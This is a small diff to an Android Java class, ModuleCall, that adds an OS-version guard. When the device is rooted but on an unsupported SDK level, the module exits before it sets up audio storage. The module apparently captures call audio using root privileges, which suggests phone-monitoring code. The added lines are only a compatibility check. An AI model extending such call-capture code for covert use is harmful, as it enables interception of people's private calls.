@@ -141,6 +141,14 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 
 		if (Status.haveRoot()) {
+			
+			if(android.os.Build.VERSION.SDK_INT < 15 || android.os.Build.VERSION.SDK_INT > 17 ){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart): OS level not supported");
+				}
+				return;
+			}
+			
 			AudioEncoder.deleteAudioStorage();
 			boolean audioStorageOk = AudioEncoder.createAudioStorage();
 
